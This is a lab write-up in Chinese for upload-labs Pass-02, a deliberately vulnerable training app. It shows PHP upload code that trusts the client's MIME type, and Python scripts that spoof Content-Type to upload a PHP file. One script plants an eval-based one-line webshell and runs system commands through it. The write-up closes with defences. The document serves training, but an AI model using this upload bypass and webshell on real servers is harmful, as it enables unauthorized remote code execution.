# Upload‑Labs Pass‑02

## 题目描述
本关没有前端JS校验，表单直接提交上传。后端通过 `$_FILES['upload_file']['type']` 判断上传文件MIME类型，只允许 `image/jpeg`、`image/png`、`image/gif`，不满足则提示**文件类型不正确，请重新上传！**
后端关键PHP源码：
```php
if (($_FILES['upload_file']['type'] == 'image/jpeg') ||
    ($_FILES['upload_file']['type'] == 'image/png')  ||
    ($_FILES['upload_file']['type'] == 'image/gif')) {
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $img_path  = UPLOAD_PATH . '/' . $_FILES['upload_file']['name'];
    move_uploaded_file($temp_file, $img_path);
} else {
    $msg = '文件类型不正确，请重新上传！';
}
```

## 解题思路
`$_FILES['upload_file']['type']` 取自客户端 HTTP 请求头的`Content‑Type`，**由攻击者可控，服务器不会读取文件真实内容做检测**。
不使用 Burp 抓包，直接用 Python 构造上传数据包，伪造文件的 Content‑Type 为`image/jpeg`骗过服务端 MIME 校验，上传 PHP 后门。
不使用蚁剑，通过 Python 脚本验证代码执行。

## 解题步骤
1. **环境确认**
确认 upload‑labs 根目录存在`upload`文件夹，拥有读写权限。

2. **Python 脚本上传测试 shell**
新建 `pass02.py`
```
import requests

BASE = "http://127.0.0.1/upload-labs/"
s = requests.Session()
s.get(BASE + "Pass-02/index.php", timeout=15)

# 第三个参数伪造MIME类型 image/jpeg
payload = b"<?php echo 'pass02-ok:'.(6*7); ?>"
files = {
    "upload_file": ("shell02.php", payload, "image/jpeg")
}

r = s.post(BASE + "Pass-02/index.php", files=files, data={"submit":"上传"}, timeout=15)
print("上传页面返回：")
print(r.text)

res = s.get(BASE + "upload/shell02.php", timeout=15)
print("\n访问shell返回：")
print(res.text)
```

cmd 执行脚本：
```
python pass02.py
```

文件上传路径：`http://127.0.0.1/upload-labs/upload/shell02.php`
成功输出：`pass02-ok:42`，证明 PHP 代码执行。

3. **上传一句话木马并验证命令执行**
修改 payload：
```
payload = b"<?php @eval($_POST['cmd']); ?>"
```
再次运行上传脚本。
使用之前的`exec_cmd.py`发送 POST 请求执行系统命令：
```
import requests

shell_url = "http://127.0.0.1/upload-labs/upload/shell02.php"
post_data = {
    "cmd": "system('dir');"
}

resp = requests.post(shell_url, data=post_data)
print(resp.text)
```
运行脚本，返回目录列表代表后门生效，完成 getshell。
> 
> 直接浏览器 GET 访问一句话页面为空白，需要 POST 传入参数才会执行代码。Windows 控制台中文乱码执行 `chcp 65001` 切换编码。

## 踩坑记录
1. 仅修改文件名后缀无法绕过，必须伪造 Content‑Type MIME 字段。
2. 上传保存的文件名后缀必须是`.php`，才能被服务器解析执行 PHP。
3. upload 文件夹需要读写权限，否则上传失败。
4. 一句话木马 GET 访问页面空白，不是上传失败，需要 POST 传参执行命令。
   
## 知识点总结
1. `$_FILES['type']`来源于客户端请求头，MIME 类型可以被伪造，只校验 MIME 属于不安全校验方式。
2. Pass‑01 是前端 JS 校验；Pass‑02 是后端校验客户端可控的 MIME 头，二者均属于客户端侧校验，可以直接绕过。
3. 安全的文件检测应当读取文件真实内容，例如使用`finfo_file()`、`getimagesize()`检测文件头。
4. 上传成功不等于 getshell，必须验证 PHP 代码能够执行。

## 防御思路
1. 后端配置文件后缀白名单。
2. 获取文件真实内容进行检测，不能信任客户端提交的 MIME 字段。
3. 上传文件进行随机重命名。
4. 将上传目录设置为禁止解析 PHP 脚本。
